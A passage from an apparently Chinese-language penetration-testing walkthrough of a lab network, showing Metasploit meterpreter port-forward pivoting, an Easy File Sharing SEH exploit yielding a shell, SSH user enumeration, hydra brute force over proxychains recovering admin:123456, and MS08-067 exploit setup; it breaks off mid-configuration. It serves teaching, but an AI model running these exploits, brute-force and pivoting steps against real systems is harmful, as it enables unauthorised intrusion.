445/tcp&nbsp;&nbsp;open&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;microsoft-ds&nbsp;Microsoft&nbsp;Windows&nbsp;2003&nbsp;or&nbsp;2008&nbsp;microsoft-ds
Service&nbsp;Info:&nbsp;OS:&nbsp;Windows;&nbsp;CPE:&nbsp;cpe:/o:microsoft:windows,&nbsp;cpe:/o:microsoft:windows_server_2003
Host&nbsp;script&nbsp;results:
|&nbsp;smb-vuln-ms08-067:&nbsp;
|&nbsp;&nbsp;&nbsp;VULNERABLE:
|&nbsp;&nbsp;&nbsp;Microsoft&nbsp;Windows&nbsp;system&nbsp;vulnerable&nbsp;to&nbsp;remote&nbsp;code&nbsp;execution&nbsp;(MS08-067)|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;State:&nbsp;VULNERABLE
|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;IDs:&nbsp;CVE:CVE-2008-4250
|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;Server&nbsp;service&nbsp;in&nbsp;Microsoft&nbsp;Windows&nbsp;2000&nbsp;SP4,&nbsp;XP&nbsp;SP2&nbsp;and&nbsp;SP3,&nbsp;Server&nbsp;2003&nbsp;SP1&nbsp;and&nbsp;SP2,&nbsp;
|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Vista&nbsp;Gold&nbsp;and&nbsp;SP1,&nbsp;Server&nbsp;2008,&nbsp;and&nbsp;7&nbsp;Pre-Beta&nbsp;allows&nbsp;remote&nbsp;attackers&nbsp;to&nbsp;execute&nbsp;arbitrary&nbsp;
|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;code&nbsp;via&nbsp;a&nbsp;crafted&nbsp;RPC&nbsp;request&nbsp;that&nbsp;triggers&nbsp;the&nbsp;overflow&nbsp;during&nbsp;path&nbsp;canonicalization.
|&nbsp;
|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Disclosure&nbsp;date:&nbsp;2008-10-23
|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;References:
|&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250|_&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;https://technet.microsoft.com/en-us/library/security/ms08-067.aspxService&nbsp;detection&nbsp;performed.&nbsp;Please&nbsp;report&nbsp;any&nbsp;incorrect&nbsp;results&nbsp;at&nbsp;https://nmap.org/submit/&nbsp;.Nmap&nbsp;done:&nbsp;1&nbsp;IP&nbsp;address&nbsp;(1&nbsp;host&nbsp;up)&nbsp;scanned&nbsp;in&nbsp;12.51&nbsp;seconds
root@kali:~#</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">现在发现了7.7.7.20(JC)这台机器端口开放比较多,尝试找出JC的漏洞,操作如下: 首先看看JC的80端口运行了什么cms,但是Attacker的浏览器直接访问http://172.16.0.20会无法访问,因为Attacker的网段与JC 不在同一网段,此处有个要注意的内容:</span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">Attention:可以选择使用proxychains设置Attacker的浏览器的代理为Attacker的1080端口的socks4代理入口,也可通过在RD的meterpreter会 话中运行portfwd模块命令,portfwd命令如下:</span></p><pre class="brush:bash;toolbar:false">meterpreter&nbsp;&gt;&nbsp;portfwd&nbsp;add&nbsp;-L&nbsp;172.16.0.20&nbsp;-l&nbsp;2323&nbsp;-p&nbsp;80&nbsp;-r&nbsp;7.7.7.20[*]&nbsp;Local&nbsp;TCP&nbsp;relay&nbsp;created:&nbsp;172.16.0.20:2323&nbsp;&lt;-&gt;&nbsp;7.7.7.20:80meterpreter&nbsp;&gt;
meterpreter&nbsp;&gt;&nbsp;portfwd&nbsp;listActive&nbsp;Port&nbsp;Forwards
====================
&nbsp;&nbsp;&nbsp;Index&nbsp;&nbsp;Local&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Remote&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Direction
&nbsp;&nbsp;&nbsp;-----&nbsp;&nbsp;-----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;------&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;---------&nbsp;&nbsp;&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;172.16.0.20:2323&nbsp;&nbsp;7.7.7.20:80&nbsp;&nbsp;Forward1&nbsp;total&nbsp;active&nbsp;port&nbsp;forwards.
meterpreter&nbsp;&gt;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">通过访问Attacker的2323端口访问JC的80端口,结果如下:</span></p><p style="text-align: center; text-indent: 0em;"><img src="http://p8.qhimg.com/t01666c8a995bf2024a.png" alt="5.png"/></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">这里的portfwd模块不只是名字上的端口转发的意思,目前笔者认为portfwd相当于半个ssh正向代理加一个ssh反向代理组成的综合命令,ssh正向反向代理可参考这里的理解 。ssh正向反向代理理解笔者认为portfwd命令之后Attacker可以通过访问Attacker本身ip的2323端口进而访问到JC的80端口期间发生了3件事。</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">1.RD访问JC的80端口,这里相当于半个ssh正向代理</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">2.RD绑定已经访问到的JC的80端口的数据到Attacker的2323端口,这里相当于一个ssh反向代理,相当于RD有Attacker的ssh权限</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">3.攻击者的浏览器访问攻击者自己的172.16.0.20:2323</span></p><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">portfwd的用法如下:</span></p><pre class="brush:bash;toolbar:false">meterpreter&nbsp;&gt;&nbsp;portfwd&nbsp;-h
Usage:&nbsp;portfwd&nbsp;[-h]&nbsp;[add&nbsp;|&nbsp;delete&nbsp;|&nbsp;list&nbsp;|&nbsp;flush]&nbsp;[args]
OPTIONS:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-L&nbsp;&gt;opt&gt;&nbsp;&nbsp;The&nbsp;local&nbsp;host&nbsp;to&nbsp;listen&nbsp;on&nbsp;(optional).
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-h&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Help&nbsp;banner.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-l&nbsp;&gt;opt&gt;&nbsp;&nbsp;The&nbsp;local&nbsp;port&nbsp;to&nbsp;listen&nbsp;on.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-p&nbsp;&gt;opt&gt;&nbsp;&nbsp;The&nbsp;remote&nbsp;port&nbsp;to&nbsp;connect&nbsp;on.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;-r&nbsp;&gt;opt&gt;&nbsp;&nbsp;The&nbsp;remote&nbsp;host&nbsp;to&nbsp;connect&nbsp;on.
meterpreter&nbsp;&gt;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">其中-L只能设置为攻击者的ip,不能设置为肉鸡的ip,-L设置的ip可以是攻击者的内网ip,-r也可以是目标的内网ip,两个内网之 间通过meterpreter会话的&quot;隧道&quot;来连通,如果-L后设置的ip是攻击者的内网ip,-r后设置的是目标机器的内网ip,portfwd通过 meterpreter会话连通两台,-l是指攻击者的监听端口,运行完上面的portfwd add -L 172.16.0.20 -l 2323 -p 80 -r 7.7.7.20 命令后,Attacker的2323端口将变成监听状态(也即Attacker会开启2323端口) 这里还要注意route add命令只能是在meterpreter会话中有效,不能系统全局有效,笔者认为route add也是通过meterpreter会 话的&quot;隧道&quot;来实现攻击者能够访问目标机器其他网段机器的,也即在上面的Attacker通过portfwd来实现访问目标机器其他网段 机器而不能因为在portfwd模块运行前由于已经运行了route add模块而由Attacker的浏览器直接访问目标7.7.7.20:80,因为 route add只会给msf的模块提供meterpreter会话通道作为代理服务,只有meterpreter会话下可用的模块可以直接访问7.7.7.x 网段,Attacker的浏览器想直接访问7.7.7.20需要使用proxychins和msf开启的sock4代理.</span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;;">上面访问得到目标机器JC的80端口信息看出JC运行的是Eash File Sharing Web Server,可用msf中的模块尝试getshell,操作如 下(如果没有在meterpreter中添加路由msf是访问不到7.7.7.20的):</span></p><pre class="brush:bash;toolbar:false">msf&nbsp;&nbsp;&gt;&nbsp;use&nbsp;exploit/windows/http/easyfilesharing_seh&nbsp;
msf&nbsp;exploit(easyfilesharing_seh)&nbsp;&gt;&nbsp;show&nbsp;options&nbsp;
Module&nbsp;options&nbsp;(exploit/windows/http/easyfilesharing_seh):
&nbsp;&nbsp;&nbsp;Name&nbsp;&nbsp;&nbsp;Current&nbsp;Setting&nbsp;&nbsp;Required&nbsp;&nbsp;Description
&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;---------------&nbsp;&nbsp;--------&nbsp;&nbsp;-----------
&nbsp;&nbsp;&nbsp;RHOST&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;target&nbsp;address
&nbsp;&nbsp;&nbsp;RPORT&nbsp;&nbsp;80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;target&nbsp;port
Exploit&nbsp;target:
&nbsp;&nbsp;&nbsp;Id&nbsp;&nbsp;Name
&nbsp;&nbsp;&nbsp;--&nbsp;&nbsp;----
&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;Easy&nbsp;File&nbsp;Sharing&nbsp;7.2&nbsp;HTTP
msf&nbsp;exploit(easyfilesharing_seh)&nbsp;&gt;&nbsp;set&nbsp;rhost&nbsp;7.7.7.20
rhost&nbsp;=&gt;&nbsp;7.7.7.20msf&nbsp;exploit(easyfilesharing_seh)&nbsp;&gt;&nbsp;set&nbsp;payload&nbsp;windows/meterpreter/bind_tcp
payload&nbsp;=&gt;&nbsp;windows/meterpreter/bind_tcp
msf&nbsp;exploit(easyfilesharing_seh)&nbsp;&gt;&nbsp;run
[*]&nbsp;Started&nbsp;bind&nbsp;handler
[*]&nbsp;7.7.7.20:80&nbsp;-&nbsp;7.7.7.20:80&nbsp;-&nbsp;Sending&nbsp;exploit...
[+]&nbsp;7.7.7.20:80&nbsp;-&nbsp;Exploit&nbsp;Sent
[*]&nbsp;Sending&nbsp;stage&nbsp;(957999&nbsp;bytes)&nbsp;to&nbsp;7.7.7.20
[*]&nbsp;Meterpreter&nbsp;session&nbsp;2&nbsp;opened&nbsp;(172.16.0.20-172.16.0.11:0&nbsp;-&gt;&nbsp;7.7.7.20:4444)&nbsp;at&nbsp;2016-12-26&nbsp;14:21:11&nbsp;+0300</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">或者从JC(7.7.7.20)22端口入手:</span></p><pre class="brush:bash;toolbar:false">msf&nbsp;&gt;&nbsp;use&nbsp;auxiliary/scanner/ssh/ssh_enumusers&nbsp;
msf&nbsp;auxiliary(ssh_enumusers)&nbsp;&gt;&nbsp;set&nbsp;rhosts&nbsp;7.7.7.20rhosts&nbsp;=&gt;&nbsp;7.7.7.20msf&nbsp;auxiliary(ssh_enumusers)&nbsp;&gt;&nbsp;set&nbsp;rport&nbsp;22rport&nbsp;=&gt;&nbsp;22msf&nbsp;auxiliary(ssh_enumusers)&nbsp;&gt;&nbsp;set&nbsp;user_file&nbsp;/usr/share/wordlists/metasploit/default_users_for_services_unhash.txt
user_file&nbsp;=&gt;&nbsp;/usr/share/wordlists/metasploit/default_users_for_services_unhash.txt
msf&nbsp;auxiliary(ssh_enumusers)&nbsp;&gt;&nbsp;run
[*]&nbsp;7.7.7.20:22&nbsp;-&nbsp;SSH&nbsp;-&nbsp;Checking&nbsp;for&nbsp;false&nbsp;positives
[*]&nbsp;7.7.7.20:22&nbsp;-&nbsp;SSH&nbsp;-&nbsp;Starting&nbsp;scan
[+]&nbsp;7.7.7.20:22&nbsp;-&nbsp;SSH&nbsp;-&nbsp;User&nbsp;&#39;admin&#39;&nbsp;found
[-]&nbsp;7.7.7.20:22&nbsp;-&nbsp;SSH&nbsp;-&nbsp;User&nbsp;&#39;root&#39;&nbsp;not&nbsp;found
[-]&nbsp;7.7.7.20:22&nbsp;-&nbsp;SSH&nbsp;-&nbsp;User&nbsp;&#39;Administrator&#39;&nbsp;not&nbsp;found
[+]&nbsp;7.7.7.20:22&nbsp;-&nbsp;SSH&nbsp;-&nbsp;User&nbsp;&#39;sysadm&#39;&nbsp;found
[-]&nbsp;7.7.7.20:22&nbsp;-&nbsp;SSH&nbsp;-&nbsp;User&nbsp;&#39;tech&#39;&nbsp;not&nbsp;found
[-]&nbsp;7.7.7.20:22&nbsp;-&nbsp;SSH&nbsp;-&nbsp;User&nbsp;&#39;operator&#39;&nbsp;not&nbsp;found
[+]&nbsp;7.7.7.20:22&nbsp;-&nbsp;SSH&nbsp;-&nbsp;User&nbsp;&#39;guest&#39;&nbsp;found
[-]&nbsp;7.7.7.20:22&nbsp;-&nbsp;SSH&nbsp;-&nbsp;User&nbsp;&#39;security&#39;&nbsp;not&nbsp;found
[-]&nbsp;7.7.7.20:22&nbsp;-&nbsp;SSH&nbsp;-&nbsp;User&nbsp;&#39;debug&#39;&nbsp;not&nbsp;found
[+]&nbsp;7.7.7.20:22&nbsp;-&nbsp;SSH&nbsp;-&nbsp;User&nbsp;&#39;manager&#39;&nbsp;found
[-]&nbsp;7.7.7.20:22&nbsp;-&nbsp;SSH&nbsp;-&nbsp;User&nbsp;&#39;service&#39;&nbsp;not&nbsp;found
[-]&nbsp;7.7.7.20:22&nbsp;-&nbsp;SSH&nbsp;-&nbsp;User&nbsp;&#39;!root&#39;&nbsp;not&nbsp;found
[+]&nbsp;7.7.7.20:22&nbsp;-&nbsp;SSH&nbsp;-&nbsp;User&nbsp;&#39;user&#39;&nbsp;found
[-]&nbsp;7.7.7.20:22&nbsp;-&nbsp;SSH&nbsp;-&nbsp;User&nbsp;&#39;netman&#39;&nbsp;not&nbsp;found
[+]&nbsp;7.7.7.20:22&nbsp;-&nbsp;SSH&nbsp;-&nbsp;User&nbsp;&#39;super&#39;&nbsp;found
[-]&nbsp;7.7.7.20:22&nbsp;-&nbsp;SSH&nbsp;-&nbsp;User&nbsp;&#39;diag&#39;&nbsp;not&nbsp;found
[+]&nbsp;7.7.7.20:22&nbsp;-&nbsp;SSH&nbsp;-&nbsp;User&nbsp;&#39;Cisco&#39;&nbsp;found
[-]&nbsp;7.7.7.20:22&nbsp;-&nbsp;SSH&nbsp;-&nbsp;User&nbsp;&#39;Manager&#39;&nbsp;not&nbsp;found
[+]&nbsp;7.7.7.20:22&nbsp;-&nbsp;SSH&nbsp;-&nbsp;User&nbsp;&#39;DTA&#39;&nbsp;found
[-]&nbsp;7.7.7.20:22&nbsp;-&nbsp;SSH&nbsp;-&nbsp;User&nbsp;&#39;apc&#39;&nbsp;not&nbsp;found
[+]&nbsp;7.7.7.20:22&nbsp;-&nbsp;SSH&nbsp;-&nbsp;User&nbsp;&#39;User&#39;&nbsp;found
[-]&nbsp;7.7.7.20:22&nbsp;-&nbsp;SSH&nbsp;-&nbsp;User&nbsp;&#39;Admin&#39;&nbsp;not&nbsp;found
[+]&nbsp;7.7.7.20:22&nbsp;-&nbsp;SSH&nbsp;-&nbsp;User&nbsp;&#39;cablecom&#39;&nbsp;found
[-]&nbsp;7.7.7.20:22&nbsp;-&nbsp;SSH&nbsp;-&nbsp;User&nbsp;&#39;adm&#39;&nbsp;not&nbsp;found
[+]&nbsp;7.7.7.20:22&nbsp;-&nbsp;SSH&nbsp;-&nbsp;User&nbsp;&#39;wradmin&#39;&nbsp;found
[-]&nbsp;7.7.7.20:22&nbsp;-&nbsp;SSH&nbsp;-&nbsp;User&nbsp;&#39;netscreen&#39;&nbsp;not&nbsp;found
[+]&nbsp;7.7.7.20:22&nbsp;-&nbsp;SSH&nbsp;-&nbsp;User&nbsp;&#39;sa&#39;&nbsp;found
[-]&nbsp;7.7.7.20:22&nbsp;-&nbsp;SSH&nbsp;-&nbsp;User&nbsp;&#39;setup&#39;&nbsp;not&nbsp;found
[+]&nbsp;7.7.7.20:22&nbsp;-&nbsp;SSH&nbsp;-&nbsp;User&nbsp;&#39;cmaker&#39;&nbsp;found
[-]&nbsp;7.7.7.20:22&nbsp;-&nbsp;SSH&nbsp;-&nbsp;User&nbsp;&#39;enable&#39;&nbsp;not&nbsp;found
[+]&nbsp;7.7.7.20:22&nbsp;-&nbsp;SSH&nbsp;-&nbsp;User&nbsp;&#39;MICRO&#39;&nbsp;found
[-]&nbsp;7.7.7.20:22&nbsp;-&nbsp;SSH&nbsp;-&nbsp;User&nbsp;&#39;login&#39;&nbsp;not&nbsp;found
[*]&nbsp;Caught&nbsp;interrupt&nbsp;from&nbsp;the&nbsp;console...
[*]&nbsp;Auxiliary&nbsp;module&nbsp;execution&nbsp;completed
^C
msf&nbsp;auxiliary(ssh_enumusers)&nbsp;&gt;</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">然后用hydra本地用msf模块开启的1080端口的sock4代理尝试爆破:</span></p><pre class="brush:bash;toolbar:false">root@kali:~#&nbsp;proxychains&nbsp;hydra&nbsp;7.7.7.20&nbsp;ssh&nbsp;-s&nbsp;22&nbsp;-L&nbsp;/tmp/user.txt&nbsp;-P&nbsp;top100.txt&nbsp;-t&nbsp;4
ProxyChains-3.1&nbsp;(http://proxychains.sf.net)
Hydra&nbsp;v8.2&nbsp;(c)&nbsp;2016&nbsp;by&nbsp;van&nbsp;Hauser/THC&nbsp;-&nbsp;Please&nbsp;do&nbsp;not&nbsp;use&nbsp;in&nbsp;military&nbsp;or&nbsp;secret&nbsp;service&nbsp;organizations,&nbsp;or&nbsp;for&nbsp;illegal&nbsp;purposes.
Hydra&nbsp;(http://www.thc.org/thc-hydra)&nbsp;starting&nbsp;
[WARNING]&nbsp;Restorefile&nbsp;(./hydra.restore)&nbsp;from&nbsp;a&nbsp;previous&nbsp;session&nbsp;found,&nbsp;to&nbsp;prevent&nbsp;overwriting,&nbsp;you&nbsp;have&nbsp;10&nbsp;seconds&nbsp;to&nbsp;abort...
[DATA]&nbsp;max&nbsp;4&nbsp;tasks&nbsp;per&nbsp;1&nbsp;server,&nbsp;overall&nbsp;64&nbsp;tasks,&nbsp;20&nbsp;login&nbsp;tries&nbsp;(l:2/p:10),&nbsp;~0&nbsp;tries&nbsp;per&nbsp;task
[DATA]&nbsp;attacking&nbsp;service&nbsp;ssh&nbsp;on&nbsp;port&nbsp;22
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-7.7.7.20:22-|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK&lt;&gt;&lt;&gt;-OK&lt;&gt;&lt;&gt;-OK&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK
[22][ssh]&nbsp;host:&nbsp;7.7.7.20&nbsp;&nbsp;&nbsp;login:&nbsp;admin&nbsp;&nbsp;&nbsp;password:&nbsp;123456
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK
|S-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK
1&nbsp;of&nbsp;1&nbsp;target&nbsp;successfully&nbsp;completed,&nbsp;1&nbsp;valid&nbsp;password&nbsp;found
Hydra&nbsp;(http://www.thc.org/thc-hydra)&nbsp;finished
root@kali:~#</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">发现有可用帐户密码admin:123456,然后再用sock4代理ssh登录:</span></p><pre class="brush:bash;toolbar:false">root@kali:~#&nbsp;proxychains&nbsp;ssh&nbsp;admin@7.7.7.20
ProxyChains-3.1&nbsp;(http://proxychains.sf.net)
|D-chain|-&lt;&gt;-172.16.0.20:1080-&lt;&gt;&lt;&gt;-7.7.7.20:22-&lt;&gt;&lt;&gt;-OK
The&nbsp;authenticity&nbsp;of&nbsp;host&nbsp;&#39;7.7.7.20&nbsp;(7.7.7.20)&#39;&nbsp;can&#39;t&nbsp;be&nbsp;established.
ECDSA&nbsp;key&nbsp;fingerprint&nbsp;is&nbsp;SHA256:Rcz2KrPF3BTo16Ng1kET91ycbr9c8vOkZcZ6b4VawMQ.
Are&nbsp;you&nbsp;sure&nbsp;you&nbsp;want&nbsp;to&nbsp;continue&nbsp;connecting&nbsp;(yes/no)?&nbsp;yes
Warning:&nbsp;Permanently&nbsp;added&nbsp;&#39;7.7.7.20&#39;&nbsp;(ECDSA)&nbsp;to&nbsp;the&nbsp;list&nbsp;of&nbsp;known&nbsp;hosts.
admin@7.7.7.20&#39;s&nbsp;password:&nbsp;
bvshell:/C/Documents&nbsp;and&nbsp;Settings/All&nbsp;Users$&nbsp;pwd
/C/Documents&nbsp;and&nbsp;Settings/All&nbsp;Users
bvshell:/C/Documents&nbsp;and&nbsp;Settings/All&nbsp;Users$&nbsp;dir
2016-12-24&nbsp;&nbsp;21:32&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;Application&nbsp;Data
2016-12-25&nbsp;&nbsp;06:16&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;Desktop
2016-12-24&nbsp;&nbsp;18:36&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;Documents
2016-12-24&nbsp;&nbsp;18:37&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;DRM
2016-12-24&nbsp;&nbsp;21:32&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;Favorites
2016-12-24&nbsp;&nbsp;18:38&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;Start&nbsp;Menu
2016-12-24&nbsp;&nbsp;21:32&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&lt;DIR&gt;&nbsp;Templates
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;Files&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;bytes
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;7&nbsp;Directories
bvshell:/C/Documents&nbsp;and&nbsp;Settings/All&nbsp;Users$</pre><p style="text-indent: 2em;"><span style="font-family: 微软雅黑, &quot;Microsoft YaHei&quot;; text-indent: 2em;">或者用ms08067:</span></p><pre class="brush:bash;toolbar:false">msf&nbsp;&gt;&nbsp;use&nbsp;exploit/windows/smb/ms08_067_netapi&nbsp;
msf&nbsp;exploit(ms08_067_netapi)&nbsp;&gt;&nbsp;show&nbsp;options&nbsp;
Module&nbsp;options&nbsp;(exploit/windows/smb/ms08_067_netapi):
&nbsp;&nbsp;&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Current&nbsp;Setting&nbsp;&nbsp;Required&nbsp;&nbsp;Description
&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;---------------&nbsp;&nbsp;--------&nbsp;&nbsp;-----------
&nbsp;&nbsp;&nbsp;RHOST&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;target&nbsp;address
&nbsp;&nbsp;&nbsp;RPORT&nbsp;&nbsp;&nbsp;&nbsp;445&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;SMB&nbsp;service&nbsp;port
&nbsp;&nbsp;&nbsp;SMBPIPE&nbsp;&nbsp;BROWSER&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;pipe&nbsp;name&nbsp;to&nbsp;use&nbsp;(BROWSER,&nbsp;SRVSVC)
Exploit&nbsp;target:
&nbsp;&nbsp;&nbsp;Id&nbsp;&nbsp;Name
&nbsp;&nbsp;&nbsp;--&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;Automatic&nbsp;Targeting
msf&nbsp;exploit(ms08_067_netapi)&nbsp;&gt;&nbsp;set&nbsp;rhost&nbsp;7.7.7.20rhost&nbsp;=&gt;&nbsp;7.7.7.20msf&nbsp;exploit(ms08_067_netapi)&nbsp;&gt;&nbsp;set&nbsp;payload&nbsp;windows/meterpreter/bind_tcp
payload&nbsp;=&gt;&nbsp;windows/meterpreter/bind_tcp
msf&nbsp;exploit(ms08_067_netapi)&nbsp;&gt;&nbsp;show&nbsp;options&nbsp;
Module&nbsp;options&nbsp;(exploit/windows/smb/ms08_067_netapi):
&nbsp;&nbsp;&nbsp;Name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Current&nbsp;Setting&nbsp;&nbsp;Required&nbsp;&nbsp;Description
&nbsp;&nbsp;&nbsp;----&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;---------------&nbsp;&nbsp;--------&nbsp;&nbsp;-----------
&nbsp;&nbsp;&nbsp;RHOST&nbsp;&nbsp;&nbsp;&nbsp;7.7.7.20&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;target&nbsp;address
&nbsp;&nbsp;&nbsp;RPORT&nbsp;&nbsp;&nbsp;&nbsp;445&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;SMB&nbsp;service&nbsp;port
&nbsp;&nbsp;&nbsp;SMBPIPE&nbsp;&nbsp;BROWSER&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The&nbsp;pipe&nbsp;name&nbsp;to&nbsp;use&nbsp;(BROWSER,&nbsp;SRVSVC)
Payload&nbsp;options&nbsp;(windows/meterpreter/bind_tcp):
